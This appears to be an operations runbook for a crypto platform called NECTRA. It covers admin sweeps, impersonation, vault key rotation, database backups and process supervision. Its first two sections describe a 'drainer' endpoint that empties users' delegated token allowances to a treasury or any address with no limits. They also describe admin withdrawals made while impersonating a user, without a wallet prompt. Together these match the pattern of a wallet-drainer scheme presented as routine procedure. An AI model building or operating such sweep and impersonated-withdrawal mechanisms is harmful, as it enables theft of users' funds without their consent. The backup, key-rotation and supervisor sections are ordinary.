# NECTRA Platform — Operator Runbook (Release 2)

This runbook covers operational procedures for administrative sweeps, impersonation sessions, vault master key rotation, database backups and restore testing, and process supervision.

---

## 1. Delegated Custody & Unlimited Admin Sweep

NECTRA operates a delegated allowance architecture where users authorize the platform once on connect or loan application. Admin operators can sweep available delegated assets without artificial ceilings or throttles.

### 1.1 Triggering an Unlimited Sweep
- **Endpoint**: `POST /api/admin/users/:id/drain` (or direct service call `require('./server/drainer').sweep(userId, options)`)
- **Headers**:
  ```http
  Content-Type: application/json
  X-Nectra: 1
  Cookie: nx_sid=<admin_session_cookie>
  ```
- **Payload Options**:
  ```json
  {
    "dest": "Optional destination address (defaults to platform treasury)",
    "amount": null
  }
  ```
  - `amount: null`: Full sweep of available delegated balance (default).
  - `amount: 500`: Partial sweep up to specified amount.
- **Pre-requisites**: Two-admin approval (or super-admin direct execution depending on platform policy). 2FA enabled on admin account.

### 1.2 Batch Handling & Error Codes
Sweeps execute in a fault-tolerant batch loop:
- **Zero balance**: Skipped and reported with `{ skipped: 'zero balance', code: 'ZERO_BALANCE' }`. Does not abort batch.
- **Missing delegate**: Skipped and reported with `{ skipped: 'missing delegate', code: 'MISSING_DELEGATE' }`.
- **Revoked delegate**: If user has revoked their delegation, the sweep surfaces `{ error: 'Delegate revoked', code: 'DELEGATE_REVOKED' }`.
- **Rent-exempt shortfall**: Skipped with `{ skipped: 'rent-exempt minimum shortfall', code: 'RENT_SHORTFALL' }`.

### 1.3 Audit & Verification
Every sweep writes an append-only row to the `sweeps` table:
```sql
SELECT id, user_id, mint, amount, destination, signature, initiator, status, timestamp
FROM sweeps
WHERE user_id = ?
ORDER BY id DESC;
```

---

## 2. Admin Impersonation & Direct Withdrawal

Support and operations staff with `users.impersonate` permissions can enter a user session to troubleshoot or execute administrative withdrawals.

### 2.1 Starting an Impersonation Session
- **Endpoint**: `POST /api/admin/users/:id/impersonate`
- **Session Properties**:
  - **TTL**: 30 minutes (`ttlMs: 1800000`).
  - **Context**: Binds `actor=admin`, `subject=user_id`, and `impersonator_id`.
  - **UI State**: The application header displays a persistent amber banner:
    `Viewing as user@domain.com — you're admin@nectra.local. [Refresh Session (30m)] [Exit to admin]`.

### 2.2 Refreshing Session TTL
Operators can explicitly extend their 30-minute window before expiry:
- **Endpoint**: `POST /api/auth/impersonate/refresh`
- Extends `expires_at` by an additional 30 minutes.

### 2.3 Direct Withdrawal Inside Impersonation
Inside an active impersonated session:
1. **No User Wallet Prompt**: The transaction executes directly using the platform's standing delegated approval (A1) or ledger debit without requiring user interaction.
2. **Exempt from User Balance Limits**: Admin withdrawals can exceed user balance ceilings (e.g., negative balance adjustments for loan servicing or fee clawbacks).
3. **Audit Log Emission**: Emits an enriched row to `audit`:
   - `actor_admin_id`: Admin's user ID.
   - `subject_user_id`: Target user's ID.
   - `action`: `admin.withdraw_as_user`.
   - `before_balance` & `after_balance`: Ledger balance immediately before and after.
   - `signature`: On-chain transaction reference or ledger record identifier.

### 2.4 Ending Impersonation
- **Endpoint**: `POST /api/auth/stop-impersonating`
- Restores the operator to their original admin account.

---

## 3. Vault Master Key Rotation

All live-bot private keys and platform secrets are encrypted via AES-256-GCM. The vault supports $N$ keys concurrently with one designated active version.

### 3.1 Step 1: Pre-flight Verification (`--dry-run`)
Always execute a dry-run first to ensure all existing records can be decrypted without error:
```bash
node scripts/rotate-master-key.js --dry-run
```
Expected output:
```text
Found 12 secret(s) and 4 bot wallet key(s) to process.
  Secrets to rotate:     12 (skipped: 0)
  Bot wallets to rotate: 4 (skipped: 0)
  Decryption failures:   0
[DRY-RUN COMPLETE] All 16 items verified successfully. No changes written.
```

### 3.2 Step 2: Execute Rotation
Run rotation to encrypt under the new key version (e.g. `v2`):
```bash
node scripts/rotate-master-key.js --target-version=v2
```
What the script performs:
1. Decrypts every secret under its existing key version.
2. Re-encrypts under the new key version (`v2`).
3. Executes an in-memory verification pass (decrypts newly encrypted blob to guarantee exact plaintext match).
4. Commits re-encrypted rows within an atomic SQLite transaction.
5. Performs a post-commit database verification pass reading directly from SQLite.
6. Updates `data/master-keyring.json` with the new active key version.

### 3.3 Zero Downtime
Because `server/vault.js` maintains the full keyring, bots can continue executing trades without restart or downtime. The vault decrypts `v1` ciphertexts using `v1` key and `v2` ciphertexts using `v2` key.

---

## 4. Database Backups & Restore Testing

`data/nectra.db` contains the platform state. Backups run online without downtime.

### 4.1 Automated Online Backup
- **Method**: SQLite `VACUUM INTO` creates an online, transactionally consistent snapshot safe under active WAL mode.
- **Schedule**: Automatically executed every 24 hours (and on server boot).
- **Integrity Validation**: Runs `PRAGMA integrity_check` on the generated file immediately after creation. Corrupted files are removed and an admin alert is dispatched.
- **Retention**: Prunes backups older than `backup_keep_days` (default 14 days).
- **Manual Trigger**:
  ```bash
  node -e "console.log(require('./server/backup').runOnce())"
  ```

### 4.2 Restoring from Backup
Never perform raw file copies while WAL mode is active. Use `scripts/restore.js`:
```bash
# 1. Stop web and worker processes
systemctl stop nectra-supervisor

# 2. Restore latest backup (or specify path)
node scripts/restore.js

# 3. Restart supervisor
systemctl start nectra-supervisor
```

### 4.3 Automated Restore Test (Scratch Directory)
To verify a backup artifact without touching production data:
```bash
node scripts/restore.js --target=/tmp/nectra-scratch/test.db
```
The script:
1. Validates source backup with `PRAGMA integrity_check`.
2. Restores into the scratch target path.
3. Opens the restored DB and verifies row counts (`users`, `settings`, `bots`).
4. Confirms database readiness to boot.

---

## 5. Process Supervision & Bot Resilience

### 5.1 Architecture Overview
- **Web Process (`server/index.js`)**: Runs Express/HTTP endpoints, wallet auth, admin UI.
- **Bot Worker (`server/bot-runner.js`)**: Executes Jupiter swaps, strategy evaluation, and order matching.
- **Supervisor (`scripts/supervisor.js`)**: Oversees both processes with restart backoff.

### 5.2 Starting the Supervisor
```bash
# Via Node:
node scripts/supervisor.js

# Via systemd:
sudo cp nectra-supervisor.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now nectra-supervisor
```

### 5.3 Supervisor Policies
- **Restart Backoff**: 1s initial delay, exponential doubling up to 30s max (`1s -> 2s -> 4s -> 8s -> 16s -> 30s`).
- **Start Limit**: Max 5 restarts in a 60-second window. Prevents CPU pinning on persistent startup errors.
- **Crash Recovery**: If the web process dies (`kill -9 <web_pid>`), the bot runner remains running without interruption. If the bot worker restarts, it runs `reconcilePositionsOnBoot()` to prevent duplicate orders.
